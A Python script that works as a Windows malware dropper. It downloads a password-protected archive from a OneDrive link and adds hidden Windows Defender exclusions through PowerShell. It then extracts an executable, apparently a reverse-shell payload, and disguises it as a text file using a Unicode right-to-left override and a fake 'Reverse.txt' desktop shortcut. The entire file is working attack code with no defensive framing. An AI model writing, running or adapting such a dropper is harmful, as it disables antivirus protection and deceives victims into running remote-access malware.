import urllib.request
import subprocess
import os
import winshell
import py7zr
import appdirs

file_urls = [
    ("https://api.onedrive.com/v1.0/shares/s!Ary-0P-yV3rdoyRqvTBoHb6VbXjt/root/content", "C:\\Reverse.7z")
]

for url, save_path in file_urls:
    urllib.request.urlretrieve(url, save_path)

zip_filep="C:\\Reverse.7z"
zip_content="C:\\reverse.exe"
destination_dir= appdirs.user_data_dir()
destination_file = "Revers\u202Etxt.exe"
destination_path = os.path.join(destination_dir, destination_file)
shortcut_path=os.path.expanduser("~\\Desktop")
icon_path = "C:\\Windows\\system32\\shell32.dll"

powershell_cmds = [
    f'Add-MpPreference -ExclusionPath "{zip_content}"',
    f'Add-MpPreference -ExclusionPath "{destination_path}"',
    f'Add-MpPreference -ExclusionPath "{shortcut_path}"'
]

for cmd in powershell_cmds:
    subprocess.run(["powershell.exe", "-WindowStyle", "Hidden", "-Command", cmd], capture_output=True)

with py7zr.SevenZipFile(zip_filep, mode='r', password='password') as z:
    z.extractall(path="C:\\")

if os.path.exists(destination_path):
    os.remove(destination_path)

os.rename("C:\\reverse.exe", destination_path)

shortcut_name = "Reverse.txt.lnk"
shortcut_path = os.path.join(winshell.desktop(), shortcut_name)
icon_path = "C:\\Windows\\system32\\shell32.dll"

winshell.CreateShortcut(
    Path=shortcut_path,
    Target=destination_path,
    Icon=(icon_path,70)
)